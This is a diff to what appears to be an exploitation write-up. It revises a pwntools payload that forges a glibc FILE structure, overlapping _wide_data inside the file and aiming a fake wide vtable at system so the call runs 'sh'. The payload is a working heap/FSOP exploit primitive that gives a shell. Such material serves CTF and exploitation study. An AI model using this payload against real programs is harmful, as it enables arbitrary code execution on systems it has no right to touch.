@@ -238,20 +238,21 @@ contained within the victim file struct.
 
 ```py
 payload = flat({
+    # _IO_file_plus
     0x00: b"  sh",
-
     0x20: 0x0,
     0x28: 0x1,
-
     0x88: libc.sym._IO_stdfile_1_lock,
-    0xa0: libc.sym._IO_2_1_stdout_,
+    0xa0: libc.sym._IO_2_1_stdout_-0x10,
     0xc0: 0x0,
     0xd8: libc.sym._IO_wfile_jumps-0x20,
-
-    0x18: 0x0,
-    0x30: 0x0,
-    0xe0: libc.sym._IO_2_1_stdout_,
-
+ 
+    # _wide_data (shifted to fit in file)
+    0x18 - 0x10: 0x0,
+    0x30 - 0x10: 0x0, # actually redundant - 0x20 is already set
+    0xe0 - 0x10: libc.sym._IO_2_1_stdout_,
+ 
+    # _wide_vtable
     0x68: libc.sym.system
 }, filler=b"\x00")
 ```
